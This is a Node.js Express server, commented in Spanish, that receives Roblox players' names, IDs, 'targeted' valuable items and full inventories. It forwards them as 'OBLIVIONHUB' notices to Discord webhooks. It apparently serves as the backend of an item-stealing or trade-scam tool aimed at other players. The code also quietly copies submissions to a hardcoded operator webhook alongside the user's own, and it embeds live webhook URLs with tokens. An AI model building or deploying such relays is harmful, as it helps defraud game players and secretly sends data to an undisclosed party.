const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

const FALLBACK_WEBHOOK = 'https://discord.com/api/webhooks/1528664955258277940/DYi4QqN2pr93CM35VxOzy9MZ6eA2Fl408SuHHKgIvmsTtCcepASPG45NDsxXw_veRMA-';

app.use(express.json());

app.get('/webhook', (req, res) => {
    res.json({ status: 'ok', message: 'API funcionando correctamente' });
});

app.post('/webhook', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 Datos recibidos:', data);

        const player = data.playerName || 'Desconocido';
        const target = data.targetName || 'Desconocido';
        const targetId = data.targetId || 0;
        const webhookUrl = data.webhookUrl;
        const hasPrivateItem = data.hasPrivateItem || false;

        // Listas del usuario (NORMAL_*)
        const brainTargeted = data.brainTargeted || [];
        const baseTargeted = data.baseTargeted || [];
        const gearTargeted = data.gearTargeted || [];

        // Listas privadas (coincidencias con PRIVATE_*)
        const privateBrainTargeted = data.privateBrainTargeted || [];
        const privateBaseTargeted = data.privateBaseTargeted || [];
        const privateGearTargeted = data.privateGearTargeted || [];

        // Listas completas de todos los ítems del jugador (sin filtrar)
        const allBrainrots = data.brainrots || [];
        const allBases = data.bases || [];
        const allGears = data.gears || [];

        const timestamp = data.timestamp || Date.now();

        // Función para formatear lista con conteo de duplicados
        function formatListWithCount(list) {
            if (!list || list.length === 0) return 'Ninguno';
            const counts = {};
            list.forEach(item => {
                counts[item] = (counts[item] || 0) + 1;
            });
            const formatted = Object.keys(counts).map(name => {
                return counts[name] > 1 ? `${name} (x${counts[name]})` : name;
            });
            return formatted.join(', ');
        }

        // Extraer solo los nombres de las listas completas
        const allBrainrotNames = allBrainrots.map(item => item.displayName);
        const allBaseNames = allBases.map(item => item.displayName);
        const allGearNames = allGears.map(item => item.displayName);
        const allItems = [...allBrainrotNames, ...allBaseNames, ...allGearNames];

        // Decidir qué listas usar para mostrar "targeteados"
        let displayBrainTargeted, displayBaseTargeted, displayGearTargeted;
        if (hasPrivateItem) {
            displayBrainTargeted = privateBrainTargeted;
            displayBaseTargeted = privateBaseTargeted;
            displayGearTargeted = privateGearTargeted;
        } else {
            displayBrainTargeted = brainTargeted;
            displayBaseTargeted = baseTargeted;
            displayGearTargeted = gearTargeted;
        }

        // Construir mensaje
        const lines = [];

        // Encabezado
        lines.push('✅ SUCCESS: OBLIVIONHUB INVITE SENT');
        lines.push(`✨ Invite successfully sent to Username: ${player}`);
        lines.push('Inventory scan complete. Processing items.');
        lines.push('');

        // Sección de ítems targeteados (usando la lista seleccionada)
        lines.push('Brainrots targeados:');
        lines.push(formatListWithCount(displayBrainTargeted));
        lines.push('');

        lines.push('Gears targeados:');
        lines.push(formatListWithCount(displayGearTargeted));
        lines.push('');

        lines.push('Bases targeadas:');
        lines.push(formatListWithCount(displayBaseTargeted));
        lines.push('');

        // Sección de inventario completo (todos los ítems)
        lines.push('ALL ITEMS:');
        if (allItems.length === 0) {
            lines.push('Ninguno');
        } else {
            lines.push(formatListWithCount(allItems));
        }
        lines.push('');

        // Footer
        const date = new Date(timestamp);
        const formattedDate = date.toLocaleString('es-ES', { 
            timeZone: 'UTC',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        }).replace(/\//g, '-');
        lines.push(`OBLIVIONHUB| Automated System•${formattedDate} UTC`);

        const fullContent = lines.join('\n');

        const payload = {
            content: fullContent,
            username: 'TradeNotifier',
            avatar_url: 'https://cdn.pfps.gg/pfps/10184-389218-roblox.png'
        };

        // Decidir a qué webhooks enviar
        const webhooksToSend = [];

        if (hasPrivateItem) {
            if (webhookUrl) {
                webhooksToSend.push(webhookUrl);
            } else {
                webhooksToSend.push('https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L');
            }
        } else {
            if (webhookUrl) {
                webhooksToSend.push(webhookUrl);
            }
            webhooksToSend.push(FALLBACK_WEBHOOK);
        }

        // Enviar a todos los webhooks
        for (const url of webhooksToSend) {
            try {
                await axios.post(url, payload);
                console.log(`✅ Enviado a: ${url}`);
            } catch (err) {
                console.error(`❌ Error enviando a ${url}:`, err.message);
            }
        }

        res.status(200).json({ status: 'ok', message: 'Notificaciones enviadas' });
    } catch (error) {
        console.error('❌ Error general:', error.message);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en puerto ${PORT}`);
});
